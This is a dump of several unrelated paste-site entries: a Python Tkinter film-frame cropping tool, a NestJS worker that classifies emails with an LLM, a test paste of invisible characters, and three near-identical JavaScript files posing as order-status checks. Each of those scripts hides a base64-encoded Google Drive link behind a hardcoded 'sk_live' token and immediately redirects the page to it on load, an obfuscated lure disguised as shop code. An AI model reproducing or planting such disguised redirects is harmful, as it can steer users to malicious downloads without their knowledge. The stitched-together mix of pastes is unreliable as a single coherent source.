frame_counter = 1            # Frame counter (used for unique filenames)
processed_count = 0          # Total count of processed strips
image_queue = []             # List of image file paths to process
update_pending = False       # Flag indicating if preview update is underway
update_requested = False     # Flag to queue a preview update if one is already running
stop_requested = False       # Flag to signal a processing stop

# Adjustable cropping parameters
frame_x_offset = 50          # Horizontal offset for cropped frames
frame_y_offset = 250         # Vertical offset for cropped frames
frame_width_max = 850        # Maximum width for cropped frames
frame_height_max = 1700       # Maximum height for cropped frames

# Folder paths (to be set in the GUI)
input_folder = """"
output_folder = """"

# Global variables for dialogs and overlays
loading_window = None        # The modal processing dialog
loading_label = None         # The overlay label for preview updates

# =============================================================================
# Image Processing Functions
# =============================================================================
def load_image(image_path):
    """"""
    Loads and validates an image from the given path.
    Returns:
        numpy.ndarray: Loaded image, or None if loading fails.
    """"""
    try:
        debug_print(f""🔍 Attempting to load image: {image_path}"")
        formatted_path = os.path.normpath(image_path)
        debug_print(f""🔄 Reformatted path: {formatted_path}"")
        
        if not os.path.exists(formatted_path):
            debug_print(f""❌ File does not exist: {formatted_path}"")
            return None
        
        time.sleep(1)  # Pause to ensure file writing is complete
        
        file_type = imghdr.what(formatted_path)
        if file_type not in ['jpeg', 'png']:
            debug_print(f""❌ Unsupported file type: {file_type}"")
            return None
        
        debug_print(f""✅ Validated file type: {file_type}"")
        image = cv2.imread(formatted_path)
        if image is None:
            debug_print(f""❌ Failed to load image: {formatted_path}"")
        else:
            debug_print(f""✅ Image loaded with shape: {image.shape}"")
        return image

    except cv2.error as e:
        debug_print(f""❌ OpenCV error in load_image: {e}"")
        return None
    except Exception as e:
        debug_print(f""❌ Unexpected error in load_image: {e}"")
        return None

def detect_and_crop_frames(image_path):
    """"""
    Detects sprocket holes and calculates cropping areas.
    Skips the first cropped frame (which is assumed to be unwanted).
    Returns:
        list: Cropped frames as numpy arrays.
    """"""
    try:
        sprocket_count = 0
        cropped_frames = []

        original_image = load_image(image_path)
        if original_image is None:
            debug_print(f""❌ Error loading image: {image_path}"")
            return []

        rotated_image = cv2.rotate(original_image, cv2.ROTATE_180)
        gray = cv2.cvtColor(rotated_image, cv2.COLOR_BGR2GRAY)
        _, thresh = cv2.threshold(gray, threshold_value, 255, cv2.THRESH_BINARY)
        cnts, _ = cv2.findContours(thresh, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
        debug_print(f""🛠 Found {len(cnts)} contours."")

        # Sort contours by x-coordinate (right to left), and for matching x-values, sort by y (top to bottom)
        cnts = sorted(cnts, key=lambda x: (cv2.boundingRect(x)[0], -cv2.boundingRect(x)[1]), reverse=True)
        
        # **Validation debug print** - Check the order of sorted contours
        for idx, c in enumerate(cnts):
            x, y, w, h = cv2.boundingRect(c)
            debug_print(f""🔍 Contour {idx}: x={x}, y={y}, w={w}, h={h}"")
            

        for c in cnts:
            x, y, w, h = cv2.boundingRect(c)
            aspect_ratio = w / float(h)
            if 0.2 < aspect_ratio < 1.0 and w < 300 and h > 50:
                sprocket_count += 1
                debug_print(f""🔴 Sprocket #{sprocket_count}: x={x}, y={y}, w={w}, h={h}"")
                frame_x = max(x + frame_x_offset, 0)
                frame_y = max(y - frame_y_offset, 0)
                frame_w = min(frame_width_max, rotated_image.shape[1] - frame_x)
                frame_h = min(frame_height_max, rotated_image.shape[0] - frame_y)
                debug_print(f""📌 Cropping frame: x={frame_x}, y={frame_y}, w={frame_w}, h={frame_h}"")
                frame = rotated_image[frame_y:frame_y + frame_h, frame_x:frame_x + frame_w]
                debug_print(f""Appending frame: x={frame_x}, y={frame_y}, w={frame_w}, h={frame_h}"")
                if frame.size > 0:
                    cropped_frames.append(frame)
                else:
                    debug_print(""⚠️ Skipped empty frame."")

        debug_print(f""✅ Sprocket count: {sprocket_count}, frames before skip: {len(cropped_frames)}"")
        if cropped_frames:
            debug_print(""🔧 Skipping first cropped frame (likely unwanted)."")
            cropped_frames = cropped_frames[1:]
        debug_print(f""✅ Final cropped frames count: {len(cropped_frames)}"")
        return cropped_frames

    except cv2.error as e:
        debug_print(f""❌ OpenCV error in detect_and_crop_frames: {e}"")
        return []
    except Exception as e:
        debug_print(f""❌ Unexpected error in detect_and_crop_frames: {e}"")
        return []

# =============================================================================
# GUI Update Functions
# =============================================================================
def update_preview():
    """"""
    Updates the preview image on the canvas.
    Loads the first image from the input folder and applies rotation, thresholding,
    and optional overlay drawing.
    """"""
    global update_pending, update_requested, image_display, processed_image
    if update_pending:
        return
    update_pending = True

    # Show the preview loading overlay
    loading_label.grid(row=0, column=0, sticky=""nsew"")
    root.update_idletasks()  # Ensure UI is updated immediately

    try:
        # Use the first file in the input folder for preview
        if input_folder and os.listdir(input_folder):
            sample_file = os.path.join(input_folder, sorted(os.listdir(input_folder))[0])
        else:
            debug_print(""⚠️ No image available for preview."")
            return

        debug_print(f""🛠 Loading image for preview: {sample_file}"")
        original_image = load_image(sample_file)
        if original_image is None:
            debug_print(f""❌ Error loading preview image: {sample_file}"")
            return

        rotated_image = cv2.rotate(original_image, cv2.ROTATE_180)
        debug_print(f""🟢 Display mode: {display_mode.get()}"")

        # Apply threshold for contour detection
        gray = cv2.cvtColor(rotated_image, cv2.COLOR_BGR2GRAY)
        _, thresh = cv2.threshold(gray, threshold_value, 255, cv2.THRESH_BINARY)
        cnts, _ = cv2.findContours(thresh, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
        debug_print(f""🛠 Detected {len(cnts)} contours."")

        # Choose the base image for preview depending on display mode
        if display_mode.get() == ""Threshold Image"":
            base_image = cv2.cvtColor(thresh, cv2.COLOR_GRAY2BGR)
            debug_print(""🖤 Using Threshold Image mode."")
        else:
            base_image = rotated_image
            debug_print(""🖼 Using Original Image mode."")

        # If overlay is enabled, draw the detection overlay
        if overlay_enabled.get():
            debug_print(""🟢 Overlay enabled."")
            overlay = base_image.copy()
            sprocket_count = 0
            for c in cnts:
                x, y, w, h = cv2.boundingRect(c)
                aspect_ratio = w / float(h)
                if 0.2 < aspect_ratio < 1.0 and w < 300 and h > 50:
                    sprocket_count += 1
                    debug_print(f""🔴 Sprocket: x={x}, y={y}, w={w}, h={h} (Count: {sprocket_count})"")
                    frame_x = max(x + frame_x_offset, 0)
                    frame_y = max(y - frame_y_offset, 0)
                    frame_w = min(frame_width_max, rotated_image.shape[1] - frame_x)
                    frame_h = min(frame_height_max, rotated_image.shape[0] - frame_y)
                    box_color = (0, 255, 0) if sprocket_count % 2 == 0 else (255, 0, 0)
                    box_overlay = overlay.copy()
                    cv2.rectangle(box_overlay, (frame_x, frame_y),
                                  (frame_x + frame_w, frame_y + frame_h),
                                  box_color, -1)
                    cv2.addWeighted(box_overlay, 0.3, overlay, 0.7, 0, overlay)
            valid_frames = sprocket_count - 1 if sprocket_count > 0 else 0
            frame_count_label.config(
                text=f""[ {valid_frames} (+1 rubbish) ] Frame(s) Detected, [ {sprocket_count} ] Sprocket(s) Detected""
            )
            base_image = overlay
        else:
            debug_print(""🔴 Overlay disabled."")

        # Resize for preview (scale factor 0.2)
        scale_factor = 0.2
        preview_resized = cv2.resize(base_image,
                                     (int(base_image.shape[1] * scale_factor),
                                      int(base_image.shape[0] * scale_factor)))
        debug_print(f""🖼 Resized preview dimensions: {preview_resized.shape}"")
        processed_image = cv2.cvtColor(preview_resized, cv2.COLOR_BGR2RGB)
        image_display = ImageTk.PhotoImage(image=Image.fromarray(processed_image))
        preview_canvas.create_image(0, 0, anchor='nw', image=image_display)
        preview_canvas.config(scrollregion=preview_canvas.bbox('all'))
        debug_print(""📌 Preview updated."")
    except Exception as e:
        debug_print(f""❌ Error in update_preview: {e}"")
    finally:
        update_pending = False
        loading_label.grid_forget()  # Hide the loading overlay
        if update_requested:
            update_requested = False
            threading.Thread(target=update_preview, daemon=True).start()

def update_threshold(value):
    """"""
    Updates the threshold value used for processing, using a 0.3-second debounce.
    """"""
    global threshold_value, debounce_time, threshold_label, update_pending, update_requested
    current_time = time.time()
    if current_time - debounce_time < 0.3:
        return
    debounce_time = current_time
    with lock:
        threshold_value = int(value)
    debug_print(f""🔧 Threshold updated to: {threshold_value}"")
    if threshold_label is not None:
        threshold_label.config(text=f""Threshold: {threshold_value}"")
    if update_pending:
        update_requested = True
    else:
        threading.Thread(target=update_preview, daemon=True).start()

def reset_gui():
    """"""
    Resets the GUI state for a new run.
    Clears the preview and resets frame and sprocket counts.
    """"""
    global processed_count, frame_counter
    processed_count = 0
    frame_counter = 1
    frame_count_label.config(text=""[ 0 ] Frame(s) Detected, [ 0 ] Sprocket(s) Detected"")
    preview_canvas.delete(""all"")
    debug_print(""🔄 GUI reset for a new run."")

def select_input_folder():
    """"""
    Opens a dialog to select the input folder.
    Updates the input folder label and refreshes the preview.
    """"""
    global input_folder
    selected = filedialog.askdirectory(title=""Select Input Folder"")
    if selected:
        input_folder = selected
        input_folder_label.config(text=""Input: "" + os.path.basename(input_folder))
    else:
        input_folder_label.config(text=""Input: Not Selected"")
    threading.Thread(target=update_preview, daemon=True).start()

def select_output_folder():
    """"""
    Opens a dialog to select the output folder and updates the folder label.
    """"""
    global output_folder
    selected = filedialog.askdirectory(title=""Select Output Folder"")
    if selected:
        output_folder = selected
        output_folder_label.config(text=""Output: "" + os.path.basename(output_folder))
    else:
        output_folder_label.config(text=""Output: Not Selected"")

# =============================================================================
# Loading Dialog / Progress Indicator Functions
# =============================================================================
def show_loading_dialog():
    """"""
    Displays a modal dialog with an indeterminate progress bar and a
    'Stop Processing' button. Resets the stop flag.
    """"""
    global loading_window, stop_requested
    stop_requested = False  # Reset for a new processing run
    loading_window = tk.Toplevel(root)
    loading_window.title(""Processing..."")
    tk.Label(loading_window, text=""Processing, please wait..."").grid(row=0, column=0, padx=10, pady=10)
    progress = ttk.Progressbar(loading_window, mode='indeterminate', length=200)
    progress.grid(row=1, column=0, padx=10, pady=10)
    progress.start()
    ttk.Button(loading_window, text=""Stop Processing"", command=stop_processing).grid(row=2, column=0, pady=10)
    loading_window.grab_set()  # Make the dialog modal

def stop_processing():
    """"""
    Signals the processing loop to stop, resets counters and clears the preview,
    then hides the loading dialog.
    """"""
    global stop_requested, processed_count, frame_counter
    stop_requested = True
    processed_count = 0
    hide_loading_dialog()
    preview_canvas.delete(""all"")
    frame_count_label.config(text=""[ 0 ] Frame(s) Detected, [ 0 ] Sprocket(s) Detected"")
    debug_print(""⏹️ Processing stopped and state reset."")

def hide_loading_dialog():
    """"""Closes the loading dialog if it exists.""""""
    global loading_window
    if loading_window is not None:
        loading_window.destroy()
        loading_window = None

def processing_complete_dialog(total_strips, total_frames):
    """"""
    Hides the loading dialog and shows a message box indicating
    that processing is complete.
    """"""
    hide_loading_dialog()
    messagebox.showinfo(""Processing Complete"", f""Processed {total_strips} strips.\nTotal frames saved: {total_frames}"")

# =============================================================================
# Image Saving Function
# =============================================================================
def save_detected_frames(detected_frames, strip_filename):
    """"""
    Saves each detected frame after rotating 90° counterclockwise and flipping vertically.
    **Now ensures frames are saved in the correct order by reversing the list before saving.**
    Returns:
        int: Number of frames saved.
    """"""
    global frame_counter
    frames_saved = 0

    # ✅ Reverse the order of detected frames before saving
    detected_frames.reverse()

    try:
        for idx, frame in enumerate(detected_frames):
            if frame is None or not isinstance(frame, np.ndarray):
                debug_print(f""❌ Invalid frame at index {idx}; skipping."")
                continue

            rotated_frame = cv2.rotate(frame, cv2.ROTATE_90_COUNTERCLOCKWISE)
            flipped_frame = cv2.flip(rotated_frame, 0)
            filename = os.path.join(output_folder, f""frame_{frame_counter:06d}.jpg"")
            cv2.imwrite(filename, flipped_frame, [cv2.IMWRITE_JPEG_QUALITY, 100])

            debug_print(f""✅ Frame saved: {filename}"")
            frame_counter += 1
            frames_saved += 1

        print(f""Strip {strip_filename}: Frames saved: {frames_saved}"")
        return frames_saved

    except cv2.error as e:
        debug_print(f""❌ OpenCV error when saving frames: {e}"")
        return frames_saved
    except OSError as e:
        debug_print(f""❌ OS error when saving frames: {e}"")
        return frames_saved
    except Exception as e:
        debug_print(f""❌ Unexpected error when saving frames: {e}"")
        return frames_saved

# =============================================================================
# Process Image Queue Function
# =============================================================================
def process_image_queue():
    """"""
    Processes all images in the input folder by detecting and cropping frames.
    Introduces a waiting period before starting to allow cancellation.
    If uninterrupted, shows a processing complete dialog.
    """"""
    global image_queue, processed_count, frame_counter, stop_requested

    if not input_folder or not output_folder:
        messagebox.showerror(""Error"", ""Please select both input and output folders before starting the process."")
        hide_loading_dialog()
        return

    image_queue = sorted(
        [os.path.join(input_folder, f)
         for f in os.listdir(input_folder)
         if f.lower().endswith(('.jpg', '.png', '.jpeg'))]
    )
    if not image_queue:
        messagebox.showerror(""Error"", ""No valid images found in the input folder."")
        hide_loading_dialog()
        return

    if stop_requested:
        debug_print(""🛑 Processing stopped before starting the loop."")
        hide_loading_dialog()
        return

    debug_print(""⏳ Waiting for user input before starting..."")
    for _ in range(20):  # 20 iterations x 0.1 s delay = 2 seconds
        if stop_requested:
            debug_print(""🛑 Processing stopped before it began."")
            hide_loading_dialog()
            return
        time.sleep(0.1)

    total_strips = 0
    for image_path in image_queue:
        if stop_requested:
            debug_print(""🛑 Processing stopped by user."")
            break
        total_strips += 1
        debug_print(f""🔍 Processing strip: {image_path}"")
        try:
            cropped_frames = detect_and_crop_frames(image_path)
            if not cropped_frames:
                debug_print(f""⚠️ No frames detected in {image_path}. Skipping."")
                continue
            for idx, frame in enumerate(cropped_frames):
                debug_print(f""Frame order before saving: index={idx}, size={frame.shape}"")
            frames_saved = save_detected_frames(cropped_frames, os.path.basename(image_path))
            processed_count += 1
        except Exception as e:
            debug_print(f""❌ Error processing {image_path}: {e}"")

    debug_print(""✅ Processing loop completed."")
    if not stop_requested:
        root.after(0, lambda: processing_complete_dialog(total_strips, frame_counter - 1))

# =============================================================================
# Tkinter GUI Setup
# =============================================================================
root = tk.Tk()
root.title(""CineFrame Cutter"")
root.grid_rowconfigure(0, weight=1)
root.grid_columnconfigure(0, weight=1)

main_frame = Frame(root)
main_frame.grid(row=0, column=0, sticky='nsew')
main_frame.grid_rowconfigure(0, weight=1)
main_frame.grid_columnconfigure(0, weight=1)

# Input/Output Folder Selection Panel
io_frame = Frame(main_frame, relief=tk.RIDGE, borderwidth=2)
io_frame.grid(row=0, column=0, sticky='ew', padx=5, pady=5)
io_frame.columnconfigure(1, weight=1)
input_folder_label = Label(io_frame, text=""Input: Not Selected"")
input_folder_label.grid(row=0, column=0, padx=5, pady=5)
ttk.Button(io_frame, text=""Browse Input"", command=select_input_folder).grid(row=0, column=1, padx=5, pady=5)
output_folder_label = Label(io_frame, text=""Output: Not Selected"")
output_folder_label.grid(row=1, column=0, padx=5, pady=5)
ttk.Button(io_frame, text=""Browse Output"", command=select_output_folder).grid(row=1, column=1, padx=5, pady=5)

# Image Preview Frame (600x450)
preview_frame = Frame(main_frame, relief=tk.SUNKEN, borderwidth=2)
preview_frame.grid(row=1, column=0, sticky='nsew', padx=5, pady=5)
preview_frame.grid_rowconfigure(0, weight=1)
preview_frame.grid_columnconfigure(0, weight=1)
preview_canvas = Canvas(preview_frame, bg='white', width=600, height=450)
preview_canvas.grid(row=0, column=0, sticky='nsew')
h_scroll = Scrollbar(preview_frame, orient=tk.HORIZONTAL, command=preview_canvas.xview)
h_scroll.grid(row=1, column=0, sticky='ew')
v_scroll = Scrollbar(preview_frame, orient=tk.VERTICAL, command=preview_canvas.yview)
v_scroll.grid(row=0, column=1, sticky='ns')
preview_canvas.configure(xscrollcommand=h_scroll.set, yscrollcommand=v_scroll.set)
loading_label = Label(preview_frame, text=""Loading preview..."", font=(""Arial"", 14), fg=""red"", bg=""white"")
loading_label.grid(row=0, column=0, sticky=""nsew"")
loading_label.grid_forget()  # Hide the loading overlay by default

# Frame and Sprocket Count Label
frame_count_label = Label(main_frame, text=""[ 0 ] Frame(s) Detected, [ 0 ] Sprocket(s) Detected"", font=(""Arial"", 12))
frame_count_label.grid(row=2, column=0, padx=5, pady=5)

# Controls Panel (Threshold, Display Mode, Overlay, Frame Area Adjusters)
controls_frame = Frame(main_frame, relief=tk.GROOVE, borderwidth=2)
controls_frame.grid(row=3, column=0, sticky='ew', padx=5, pady=5)
controls_frame.columnconfigure(0, weight=1)
threshold_label = Label(controls_frame, text=f""Threshold: {threshold_value}"", font=(""Arial"", 10))
threshold_label.grid(row=0, column=0, padx=5, pady=5, sticky='w')
threshold_slider = ttk.Scale(controls_frame, from_=0, to=255, orient='horizontal',
                             command=lambda v: update_threshold(int(float(v))))
threshold_slider.set(threshold_value)
threshold_slider.grid(row=0, column=1, padx=5, pady=5, sticky='ew')
controls_frame.columnconfigure(1, weight=1)
Label(controls_frame, text=""Display Mode:"").grid(row=1, column=0, padx=5, pady=5, sticky='w')
display_mode = tk.StringVar(value=""Threshold Image"")
display_dropdown = ttk.OptionMenu(controls_frame, display_mode, ""Threshold Image"", ""Threshold Image"", ""Original Image"")
display_dropdown.grid(row=1, column=1, padx=5, pady=5, sticky='ew')
display_mode.trace_add(""write"", lambda *args: threading.Thread(target=update_preview, daemon=True).start())
overlay_enabled = tk.BooleanVar(value=True)
overlay_checkbox = ttk.Checkbutton(controls_frame, text=""Enable Overlay"", variable=overlay_enabled,
                                   command=lambda: threading.Thread(target=update_preview, daemon=True).start())
overlay_checkbox.grid(row=2, column=0, padx=5, pady=5, sticky='w')

# Frame Area Adjustment Controls
area_frame = Frame(controls_frame, relief=tk.RIDGE, borderwidth=1)
area_frame.grid(row=3, column=0, columnspan=2, sticky='ew', padx=5, pady=5)
Label(area_frame, text=""Frame X Offset:"").grid(row=0, column=0, padx=3, pady=3, sticky='w')
x_offset_spin = Spinbox(area_frame, from_=0, to=500, width=5)
x_offset_spin.delete(0, tk.END)
x_offset_spin.insert(0, frame_x_offset)
x_offset_spin.grid(row=0, column=1, padx=3, pady=3)
Label(area_frame, text=""Frame Y Offset:"").grid(row=0, column=2, padx=3, pady=3, sticky='w')
y_offset_spin = Spinbox(area_frame, from_=0, to=500, width=5)
y_offset_spin.delete(0, tk.END)
y_offset_spin.insert(0, frame_y_offset)
y_offset_spin.grid(row=0, column=3, padx=3, pady=3)
Label(area_frame, text=""Max Width:"").grid(row=1, column=0, padx=3, pady=3, sticky='w')
width_spin = Spinbox(area_frame, from_=100, to=2000, width=5)
width_spin.delete(0, tk.END)
width_spin.insert(0, frame_width_max)
width_spin.grid(row=1, column=1, padx=3, pady=3)
Label(area_frame, text=""Max Height:"").grid(row=1, column=2, padx=3, pady=3, sticky='w')
height_spin = Spinbox(area_frame, from_=100, to=3000, width=5)
height_spin.delete(0, tk.END)
height_spin.insert(0, frame_height_max)
height_spin.grid(row=1, column=3, padx=3, pady=3)
def refresh_preview():
    """"""
    Updates global cropping parameters from the spinboxes,
    then refreshes the preview.
    """"""
    global frame_x_offset, frame_y_offset, frame_width_max, frame_height_max
    try:
        frame_x_offset = int(x_offset_spin.get())
        frame_y_offset = int(y_offset_spin.get())
        frame_width_max = int(width_spin.get())
        frame_height_max = int(height_spin.get())
        debug_print(f""Updated frame area: x_offset={frame_x_offset}, y_offset={frame_y_offset}, ""
                    f""width_max={frame_width_max}, height_max={frame_height_max}"")
        threading.Thread(target=update_preview, daemon=True).start()
    except Exception as e:
        debug_print(f""Error refreshing preview: {e}"")
refresh_button = ttk.Button(area_frame, text=""Apply Frame Size"", command=refresh_preview)
refresh_button.grid(row=2, column=0, columnspan=4, pady=5)

# Bottom Control Panel (Start, Quit, Reset Buttons)
buttons_frame = Frame(main_frame)
buttons_frame.grid(row=4, column=0, sticky='ew', padx=5, pady=5)
buttons_frame.grid_columnconfigure(3, weight=1)  # Spacer column to right-align the Quit button

start_button = ttk.Button(
    buttons_frame,
    text=""Start"",
    command=lambda: [show_loading_dialog(),
                     threading.Thread(target=process_image_queue, daemon=True).start()]
)
start_button.grid(row=0, column=0, padx=5, pady=5)

quit_button = ttk.Button(buttons_frame, text=""Quit"", command=root.destroy)
quit_button.grid(row=0, column=3, padx=5, pady=5, sticky='e')  # Placed in far-right column

def confirm_reset():
    """"""Prompts the user to confirm before resetting the GUI.""""""
    if messagebox.askyesno(""Confirm Reset"", ""Are you sure you want to reset the GUI for a new run?""):
        reset_gui()
reset_button = ttk.Button(buttons_frame, text=""Reset GUI"", command=confirm_reset)
reset_button.grid(row=0, column=2, padx=5, pady=5)

# =============================================================================
# Main Event Loop
# =============================================================================
try:
    root.mainloop()
except KeyboardInterrupt:
    debug_print(""🛑 Keyboard Interrupt: Exiting."")
"
kF5eECma,Untitled,navrajkhunger,JavaScript,Thursday 10th of April 2025 05:33:25 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/91869/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KdBXQCAG,Products.js,navrajkhunger,JavaScript,Thursday 10th of April 2025 05:18:02 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/75231/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
R8baELvX,worker,Uno2K,TypeScript,Thursday 10th of April 2025 05:10:17 PM CDT,"import { Processor, WorkerHost, InjectQueue } from '@nestjs/bullmq';
import { Job, Queue } from 'bullmq';
import { OpenAIService } from '../../infrastructure/openai/openai.service';
import { Logger } from '@nestjs/common';
import { ConfigService } from '@nestjs/config';
import { z } from 'zod';
import zodToJsonSchema from 'zod-to-json-schema';

// TODO: Some emails are failing to be classified.
/**
 * [Nest] 46190  - 04/10/2025, 6:42:23 PM   ERROR [CategorizationWorker] Failed to process categorization job 289: 429 status code (no body)
 * Error: 429 status code (no body)
 */

const systemPrompt = `
Act as an email classification expert. Classify the following email message into one of the following categories:

1 (To respond): Emails you need to respond to.
2 (FYI): Emails that don't require your response, but are important.
3 (Comment): Team chats in tools like Google Docs or Microsoft Office.
4 (Notification): Automated updates from tools you use.
5 (Meeting update): Calendar updates from Zoom, Google Meet, etc.
6 (Awaiting reply): Emails you've sent that you're expecting a reply to.
7 (Actioned): Emails you've sent that you're not expecting a reply to.
8 (Marketing): Marketing or cold emails.

Consider the following metadata provided as variables:

{
  ""sender"": ""{sender}"",
  ""subject"": ""{subject}"",
  ""body"": ""{body}"",
  ""labels"": ""{labels}"",
  ""attachments"": ""{attachments}"",
  ""date"": ""{date}"",
  ""recipients"": ""{recipients}""
}

Provide a confidence score (from 0 to 1) for your classification:
category: the classification category (as a name),
confidence: the confidence score,
reason: the reason for the classification.
`;

const emailClassificationSchema = z.object({
  category: z.enum([
    'To respond',
    'FYI',
    'Comment',
    'Notification',
    'Meeting update',
    'Awaiting reply',
    'Actioned',
    'Marketing',
  ]),
  confidence: z.number(),
  reason: z.string(),
});

interface CategorizationJobData {
  userId: string;
  emailId: string;
  subject: string;
  from: string;
  date: string;
  emailBody: string;
  labels: string[];
}

@Processor('categorization-queue')
export class CategorizationWorker extends WorkerHost {
  private readonly logger = new Logger(CategorizationWorker.name);

  constructor(
    @InjectQueue('summarization-queue')
    private readonly summarizationQueue: Queue,
    @InjectQueue('label-adding-queue')
    private readonly labelAddingQueue: Queue,
    private readonly openaiService: OpenAIService,
    private readonly configService: ConfigService,
  ) {
    super();
  }

  async process(job: Job<CategorizationJobData>): Promise<any> {
    this.logger.log(`Starting categorization for job: ${job.id}`);
    try {
      const openai = this.openaiService.getClient();

      // GPT 4o-mini
      const response = await openai.responses.create({
        model: this.configService.get<string>('openai.model') as string,
        input: [
          { role: 'system', content: systemPrompt },
          {
            role: 'user',
            content: `<email_from>${job.data.from}</email_from>
                      <email_subject>${job.data.subject}</email_subject>
                      <email_content>${job.data.emailBody}</email_content>
                      <email_labels>${job.data.labels.join(', ')}</email_labels>`,
          },
        ],
        text: {
          format: {
            type: 'json_schema',
            name: 'email_classification',
            schema: zodToJsonSchema(emailClassificationSchema),
          },
        },
      });

      // Gemini 2.0 Flash
      // const response = await openai.chat.completions.create({
      //   model: this.configService.get<string>('openai.model') as string,
      //   messages: [
      //     { role: 'system', content: systemPrompt },
      //     {
      //       role: 'user',
      //       content: `<email_from>${job.data.from}</email_from>
      //                 <email_subject>${job.data.subject}</email_subject>
      //                 <email_body>${job.data.emailBody}</email_body>
      //                 <email_labels>${job.data.labels.join(', ')}</email_labels>`,
      //     },
      //   ],
      //   response_format: zodResponseFormat(
      //     emailClassificationSchema,
      //     'email_classification',
      //   ),
      // });

      if (!response.output_text) {
        this.logger.error(`Empty response from OpenAI for job: ${job.id}`);
        throw new Error('Empty response from OpenAI');
      }

      // if (!response.choices[0].message.content) {
      //   this.logger.error(`Empty response from OpenAI for job: ${job.id}`);
      //   throw new Error('Empty response from OpenAI');
      // }

      // const parsedOutput: unknown = JSON.parse(
      //   response.choices[0].message.content,
      // );

      const parsedOutput: unknown = JSON.parse(response.output_text);

      const classificationEmail = emailClassificationSchema.parse(parsedOutput);

      const categorizationResult = {
        category: classificationEmail.category,
        confidence: classificationEmail.confidence,
        reason: classificationEmail.reason,
      };

      this.logger.log(
        `Categorization for job ${job.id}:`,
        categorizationResult,
      );

      await this.labelAddingQueue.add('add-label', {
        userId: job.data.userId,
        emailId: job.data.emailId,
        category: categorizationResult.category,
      });

      // Next step: enqueue a summarization job with the categorization result
      // await this.summarizationQueue.add('summarize-email', {
      //   emailId: job.data.emailId,
      //   ...categorizationResult,
      //   subject: job.data.subject,
      //   from: job.data.from,
      //   date: job.data.date,
      //   emailBody: job.data.emailBody,
      // });

      return {
        message: `Categorization job ${job.id} completed successfully.`,
        result: categorizationResult,
      };
    } catch (error) {
      this.logger.error(
        `Failed to process categorization job ${job.id}: ${error instanceof Error ? error.message : 'Unknown error'}`,
        error instanceof Error ? error.stack : undefined,
      );
      throw error;
    }
  }
}
"
hS4Q2Pra,Order.js,navrajkhunger,JavaScript,Thursday 10th of April 2025 05:02:39 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/17104/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
vzbhTDgz,News April10 25,Newscaster_Ned,Email,Thursday 10th of April 2025 04:54:18 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
